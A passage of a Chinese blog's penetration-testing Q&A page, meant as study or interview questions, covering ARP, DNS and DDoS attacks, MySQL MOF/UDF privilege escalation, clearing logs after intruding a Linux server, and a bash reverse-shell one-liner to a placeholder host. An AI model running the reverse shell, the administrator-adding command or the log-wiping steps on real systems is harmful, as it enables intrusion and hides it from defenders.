+<li>在本机使用 arp -s 设置ARP表的数据为静态，那么就不会接受ARP欺骗而动态修改了</li>
+<li>在网关绑定主机MAC和IP</li>
+<li>使用一些ARPon, XARP, ARPWatch等工具进行检查ARP缓存表的变更，或者使用ARP防火墙</li>
+</ul>
+
+<h4 id="q-dns欺骗原理和防护">Q：DNS欺骗原理和防护？</h4>
+
+<p>目标将其DNS请求发送到攻击者这里，然后攻击者伪造DNS响应，将正确的IP地址替换为其他IP，之后你就登陆了这个攻击者指定的IP。</p>
+
+<p>补：即使真正的DNS-ip解析响应消息返回回来，只要晚于被伪造的DNS-ip解析响应消息，后到的消息就无效。</p>
+
+<p><strong>防护</strong></p>
+
+<ul>
+<li>打开新页面时注意看域名是不是变了，不是自己真正访问的域名。</li>
+<li>或者直接记录常用网址的IP&hellip;</li>
+</ul>
+
+<h4 id="q-ddos攻击原理和防护">Q：DDOS攻击原理和防护？</h4>
+
+<p>利用合理的请求造成资源过载，导致服务不可用。</p>
+
+<p><strong>它分为两类</strong></p>
+
+<ul>
+<li>syn洪流</li>
+</ul>
+
+<p>伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYNTime（一般为30秒至2分钟），如果超时则丢弃这个连接。</p>
+
+<p>攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。</p>
+
+<ul>
+<li>CC攻击原理</li>
+</ul>
+
+<p>对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。</p>
+
+<p><strong>防护</strong></p>
+
+<p>SYN Cookie/SYN Proxy、safereset等算法。</p>
+
+<p>SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。</p>
+
+<h4 id="q-mysql提权方式和原理">Q：MySQL提权方式和原理？</h4>
+
+<p><strong>MOF提权</strong></p>
+
+<ul>
+<li>原理</li>
+</ul>
+
+<p>MOF = ‘托管对象格式‘，利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
+
+<ul>
+<li>利用条件和提权关键</li>
+</ul>
+
+<p>需要具备MySQL的root权限，才能导入 nullevt.mof 文件。在文件中添加</p>
+
+<pre><code>net.exe localgroup administrators quan /add 
+</code></pre>
+
+<p>即可在自动执行后被提权。</p>
+
+<p><strong>UDF提权</strong></p>
+
+<ul>
+<li>原理</li>
+</ul>
+
+<p>udf = ‘user defined function‘，即‘用户自定义函数’。文件后缀为‘.dll’，常用c语言编写。</p>
+
+<p>通过在lib\plugin\目录中的udf文件中定义新函数，对MYSQL的功能进行扩充，可以执行系统任意命令。</p>
+
+<p>从而达成将MYSQL账号root转化为系统system权限的效果。</p>
+
+<ul>
+<li>利用条件和提权关键</li>
+</ul>
+
+<p>需要有MySQL的用户账号，该账号需要有对MySQL进行Insert和Detele的权限。</p>
+
+<p>需要有root账号密码用来导出udf</p>
+
+<h4 id="q-各种数据库文件存放的位置">Q: 各种数据库文件存放的位置</h4>
+
+<p><strong>mysql</strong></p>
+
+<pre><code>/usr/local/mysql/data/ 
+C:\ProgramData\MySQL\MySQL Server 5.6\Data
+</code></pre>
+
+<p><strong>oracle</strong></p>
+
+<pre><code>$ORACLE_BASE/oradata/$ORACLE_SID/
+</code></pre>
+
+<h4 id="q-入侵-linux-服务器后需要清除哪些日志">Q:入侵 Linux 服务器后需要清除哪些日志？</h4>
+
+<ul>
+<li><p>web日志，如apache的access.log,error.log。直接将日志清除过于明显,一般使用sed进行定向清除，例如  sed -i -e ‘/192.169.1.1/d’</p></li>
+
+<li><p>history命令的清除，也是对~/.bash_history进行定向清除</p></li>
+
+<li><p>wtmp日志的清除，/var/log/wtmp</p></li>
+
+<li><p>登录日志清除 /var/log/secure</p></li>
+</ul>
+
+<h4 id="q-反弹shell常用命令">Q：反弹Shell常用命令？</h4>
+
+<pre><code>    bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1
+</code></pre>
+
+<h4 id="q-通过linux系统的-proc目录-能够获取到哪些信息">Q:通过Linux系统的/proc目录 ，能够获取到哪些信息，？</h4>
+
+<p>系统信息，硬件信息，内核版本，加载的模块，进程</p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://duzhi5368.github.io/tags/%E9%BB%91%E5%AE%A2/">黑客</a>
+
+                  </div>
+                
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/12/%E6%9C%88%E8%AE%B0201912/" data-tooltip="月记201912">
+              
+                <i class="fa fa-angle-left"></i>
+                <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+              </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/12/%E8%A2%AB%E5%8A%A8%E6%94%B6%E5%85%A5%E6%80%9D%E8%80%83/" data-tooltip="被动收入思考">
+              
+                <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                <i class="fa fa-angle-right"></i>
+              </a>
+            </li>
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://duzhi5368.github.io/?=https://duzhi5368.github.io/2019/12/%E6%B8%97%E9%80%8F%E9%97%AE%E7%AD%94/">
+              <i class="fa fa-home"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+            
+              
+                <div id="disqus_thread"></div>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2020 <a href="https://duzhi5368.github.io">FreeKnight</a>. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/12/%E6%9C%88%E8%AE%B0201912/" data-tooltip="月记201912">
+              
+                <i class="fa fa-angle-left"></i>
+                <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+              </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/12/%E8%A2%AB%E5%8A%A8%E6%94%B6%E5%85%A5%E6%80%9D%E8%80%83/" data-tooltip="被动收入思考">
+              
+                <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                <i class="fa fa-angle-right"></i>
+              </a>
+            </li>
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://duzhi5368.github.io/?=https://duzhi5368.github.io/2019/12/%E6%B8%97%E9%80%8F%E9%97%AE%E7%AD%94/">
+              <i class="fa fa-home"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://duzhi5368.github.io/?=https%3A%2F%2Fduzhi5368.github.io%2F2019%2F12%2F%25E6%25B8%2597%25E9%2580%258F%25E9%2597%25AE%25E7%25AD%2594%2F">
+          <i class="fa fa-home"></i><span>分享到 Homepage</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="//www.gravatar.com/avatar/323d61e9279c83a8fbccc01acf01f1e2?s=110" alt="作者的图片" />
+    
+    <h4 id="about-card-name">FreeKnight.Wong</h4>
+    
+      <div id="about-card-bio">Ever tried, ever failed, fail better.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Game software engineer
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Makati
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="搜索" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center"></div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/12/%E6%9C%88%E8%AE%B0201912/">
+                <h3 class="media-heading">月记201912</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p><strong>F.I.R.E与厄瓜多尔</strong></p>
+
+<p><strong>小孩教育</strong></p>
+
+<p><strong>Kali安装Tor</strong></p>
+
+<p><strong>硬件中断输入</strong></p>
+
+<p><strong>USB远程访问</strong></p>
+
+<p><strong>Detours进行Windows dll劫持</strong></p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/12/%E6%B8%97%E9%80%8F%E9%97%AE%E7%AD%94/">
+                <h3 class="media-heading">渗透问答</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>利用问答方式，对渗透工作做一个全面的基础的回顾和整理。</p>
+
+<p>也可以考虑用作渗透工程师面试题。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/12/%E8%A2%AB%E5%8A%A8%E6%94%B6%E5%85%A5%E6%80%9D%E8%80%83/">
+                <h3 class="media-heading">被动收入思考</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>想F.I.R.E，但资金还是差了那么一丢丢，为了应对通膨，需要最基本的被动收入来支撑。</p>
+
+<p>于是整理了一些对被动收入的理解和分析&hellip;</p>
+
+<p>但是，依然没有什么太多的收获，作为以后备忘参考吧。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/12/%E5%AE%89%E5%85%A8%E8%AE%B2%E5%BA%A7ppt/">
+                <h3 class="media-heading">安全讲座PPT</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>为公司做的安全讲座PPT，结果没人喜欢听，大家都等着看秀魔术……</p>
+
+<p>呃，但依然总结了就不想浪费，备份于此吧。</p>
+
+<p>主要包含 黑客渗透课题，安全防护课题，基本安全方案 介绍。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/12/%E6%9C%88%E8%AE%B0201911/">
+                <h3 class="media-heading">月记201911</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><ul>
+<li>产品思维</li>
+<li>黑客技术
+
+<ul>
+<li>OSCP</li>
+</ul></li>
+<li>赚钱</li>
+<li>Gap Year</li>
+<li>《论工业社会极其未来》</li>
+<li>打工</li>
+</ul>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/11/%E5%AF%B9kira%E5%90%9B%E7%9A%84%E7%AB%99%E7%82%B9%E6%B8%97%E9%80%8F%E5%B0%9D%E8%AF%95/">
+                <h3 class="media-heading">对KIRA君的站点渗透尝试</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>闲着无聊，拿Kira君的博客试试手.m(_ _)m</p>
+
+<p>最终失败了，主要原因是内网渗透不熟，先这样吧……公司这环境也不足够我做更多尝试了。</p>
+
+<p>……万恶的内网。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/11/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0google-hacking%E6%8A%80%E6%9C%AF/">
+                <h3 class="media-heading">读书笔记《Google Hacking技术》</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>这是一份人人都该去了解的最基础的HACK技术，它几乎没有编程需求，只有基本的互联网操作，值得去学习一下。</p>
+
+<p>利用信息的不对称一直是商业活动的核心要素之一。而当前我们在一个信息时代，如何利用搜索引擎获取信息，汇总信息，筛选信息则是重中之重。</p>
+
+<p>如果能够加上英语基础，扩大自己的视野，配以一个有创意灵活的脑子，就一定会在这个时代占据生存的有利环境。</p>
+
+<p>某志总结依然是“英语是基础，互联网是手段，脑子是个好东西，有这三样，金钱总会来的。”</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/11/%E5%8D%8A%E6%9C%88%E8%AE%B020191018_20191031/">
+                <h3 class="media-heading">半月记20191018_20191031</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>这半个月主要研究黑客的一些东西吧，其他变化不大，看了一些电影，哈哈~</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/10/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%B2%BE%E9%80%9Ametasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <h3 class="media-heading">读书笔记《精通Metasploit渗透测试》</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>本想简单记录一点的，一不小心就记录多了。</p>
+
+<p>一边看书过程中，一边 google 明确名词并扩展知识面。</p>
+
+<p>本文主要就是记录如何使用渗透工具Metasploit对目标进行漏洞扫描，渗透，注入攻击载荷并做后渗透破坏工作。</p>
+
+<p>嗯，本书我给打7分吧。有不少干货，但系统性上还缺了些，不足以成为神书。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/10/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6/">
+                <h3 class="media-heading">读书笔记《黑客与画家》</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>黑客伦理</p>
+
+<p>言论自由与质疑</p>
+
+<p>做伟大的事</p>
+
+<p>黑客与画家</p>
+
+<p>如何做自己喜欢的事</p>
+
+<p>思考“禁区”</p>
+
+<p>为什么该创业</p>
+
+<p>该如何创业</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero=""
+         data-message-one=""
+         data-message-other="">
+         266 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://duzhi5368.github.io/images/cover.png');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js" integrity="sha256-IFHWFEbU2/+wNycDECKgjIRSirRNIDp2acEB5fvdVRU=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js" integrity="sha256-+mpyNVJsNt4rVXCw0F+pAOiB3YxmHgrbJsx4ecPuUaI=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js" integrity="sha256-vMxgR/7FtLovVA+IPrR7+xTgIgARH7y9VZQnmmi0HDI=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js" integrity="sha256-N0qFUh7/9vLvia87dDndewmsgsyYoNkdA212tPc+2NI=" crossorigin="anonymous"></script>
+
+
+<script src="https://duzhi5368.github.io/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/duzhi5368.github.io\/2019\/12\/%E6%B8%97%E9%80%8F%E9%97%AE%E7%AD%94\/';
+          
+            this.page.identifier = '\/2019\/12\/%E6%B8%97%E9%80%8F%E9%97%AE%E7%AD%94\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'duzhi5368-github-io';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+    
+  </body>
+</html>
+
